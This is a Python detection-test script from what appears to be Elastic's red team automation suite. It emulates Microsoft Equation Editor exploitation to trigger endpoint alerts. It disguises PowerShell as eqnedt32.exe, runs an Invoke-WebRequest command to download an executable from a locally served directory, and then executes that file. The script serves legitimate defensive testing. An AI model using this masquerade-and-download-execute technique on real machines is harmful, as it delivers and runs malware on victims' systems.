# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

import logging

from . import OSType, RuleMetadata, _common, register_code_rta

log = logging.getLogger(__name__)


@register_code_rta(
    id="a0b7435a-1f48-4fae-b3dc-c596dc70490d",
    name="msequationeditor_file_written_exec",
    platforms=[OSType.WINDOWS],
    endpoint_rules=[
        RuleMetadata(
            id="8bc4f22c-9bb1-4c76-a7b6-195bee3579db",
            name="Execution of File Written or Modified by Microsoft Equation Editor",
        ),
        RuleMetadata(id="60eb5960-b26e-494a-8cf2-35ab5939f6c1", name="Microsoft Equation Editor Child Process"),
    ],
    siem_rules=[],
    techniques=["T1203", "T1566"],
)
def main():
    EXE_FILE = _common.get_resource_path("bin/renamed_posh.exe")

    server, ip, port = _common.serve_dir_over_http()
    url = f"http://{ip}:{port}/bin/renamed_posh.exe"

    eqnedt32 = "C:\\Users\\Public\\eqnedt32.exe"
    dropped = "C:\\Users\\Public\\posh.exe"
    _common.copy_file(EXE_FILE, eqnedt32)

    cmd = f"Invoke-WebRequest -Uri {url} -OutFile {dropped}"

    # Execute command
    log.info("Using a fake eqnedt32 to drop and execute an .exe")
    _ = _common.execute_command([eqnedt32, "/c", cmd], timeout_secs=10)
    _ = _common.execute_command([eqnedt32, "/c", dropped], timeout_secs=10)
    _common.remove_file(eqnedt32)
    _common.remove_file(dropped)
